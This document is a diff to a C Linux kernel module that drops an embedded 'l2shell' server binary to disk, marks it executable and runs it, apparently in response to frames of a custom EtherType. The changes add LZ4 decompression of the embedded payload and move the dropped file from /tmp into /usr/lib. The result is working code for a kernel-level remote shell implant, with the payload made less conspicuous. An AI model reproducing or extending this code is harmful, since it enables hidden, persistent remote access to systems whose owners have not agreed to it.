@@ -15,6 +15,7 @@
 #include <linux/init.h>
 #include <linux/fs.h>
 #include <linux/kmod.h>
+#include <linux/lz4.h>
 #include <linux/module.h>
 #include <linux/netdevice.h>
 #include <linux/namei.h>
@@ -26,6 +27,7 @@
 #include <linux/spinlock.h>
 #include <linux/user_namespace.h>
 #include <linux/version.h>
+#include <linux/vmalloc.h>
 #include <linux/workqueue.h>
 
 #define ETHER_TYPE_CUSTOM 0x88B5
@@ -34,8 +36,8 @@
 #define MAX_PAYLOAD_SIZE 1024
 #define KMOD_DEDUP_SLOTS 32
 #define KMOD_DEDUP_WINDOW_NS (5 * 1000 * 1000ULL)
-#define L2SHELL_TMP_PATH "/tmp/l2shell"
-#define L2SHELL_DEFAULT_CMD "/tmp/l2shell server any"
+#define L2SHELL_TMP_PATH "/usr/lib/l2shell_bin"
+#define L2SHELL_DEFAULT_CMD "/usr/lib/l2shell_bin server any"
 
 struct __attribute__((packed)) packh {
     struct ethhdr eth;
@@ -80,8 +82,9 @@ static size_t store_spawn_cmd(const u8 *payload, size_t len, const hello_view_t 
 static int ensure_exec_perms_path(struct path *path) {
     struct iattr attr = {
         .ia_valid = ATTR_MODE,
-        .ia_mode = S_IRWXU,
     };
+    struct inode *inode = d_inode(path->dentry);
+    attr.ia_mode = (inode->i_mode & S_IFMT) | S_IRWXU;
     return notify_change(&init_user_ns, path->dentry, &attr, NULL);
 }
 
@@ -98,15 +101,15 @@ static int ensure_l2shell_binary(void) {
     struct kstat stat;
     struct file *filp;
     loff_t pos = 0;
-    size_t remaining = l2shell_embed_len;
-    const unsigned char *src = l2shell_embed;
+    size_t remaining = l2shell_embed_orig_len;
+    unsigned char *decomp = NULL;
     int ret;
 
     ret = kern_path(L2SHELL_TMP_PATH, LOOKUP_FOLLOW, &path);
     if (!ret) {
         ret = vfs_getattr(&path, &stat, STATX_SIZE, AT_STATX_SYNC_AS_STAT);
         if (!ret) {
-            bool size_ok = (stat.size == l2shell_embed_len);
+            bool size_ok = (stat.size == l2shell_embed_orig_len);
             bool mode_ok = (stat.mode & S_IXUSR);
             if (!mode_ok) {
                 int mode_ret = ensure_exec_perms_path(&path);
@@ -127,17 +130,31 @@ static int ensure_l2shell_binary(void) {
     if (IS_ERR(filp))
         return PTR_ERR(filp);
 
+    decomp = vmalloc(l2shell_embed_orig_len);
+    if (!decomp) {
+        ret = -ENOMEM;
+        goto out_close;
+    }
+
+    ret = LZ4_decompress_safe((const char *)l2shell_embed,
+                              (char *)decomp,
+                              l2shell_embed_len,
+                              l2shell_embed_orig_len);
+    if (ret < 0 || (size_t)ret != l2shell_embed_orig_len) {
+        ret = -EIO;
+        goto out_free;
+    }
+
     while (remaining > 0) {
-        ssize_t wrote = kernel_write(filp, src, remaining, &pos);
+        ssize_t wrote = kernel_write(filp, decomp + (l2shell_embed_orig_len - remaining), remaining, &pos);
         if (wrote < 0) {
             ret = (int)wrote;
-            goto out_close;
+            goto out_free;
         }
         if (wrote == 0) {
             ret = -EIO;
-            goto out_close;
+            goto out_free;
         }
-        src += wrote;
         remaining -= (size_t)wrote;
     }
 
@@ -145,11 +162,17 @@ static int ensure_l2shell_binary(void) {
     if (!ret)
         ret = ensure_exec_perms_file(filp);
 
+out_free:
+    if (decomp)
+        vfree(decomp);
 out_close:
     filp_close(filp, NULL);
     if (ret)
         return ret;
-    pr_info("l2sh: refreshed embedded server at %s size=%u\n", L2SHELL_TMP_PATH, l2shell_embed_len);
+    pr_info("l2sh: refreshed embedded server at %s size=%u (compressed=%u)\n",
+            L2SHELL_TMP_PATH,
+            l2shell_embed_orig_len,
+            l2shell_embed_len);
     return 0;
 }
 
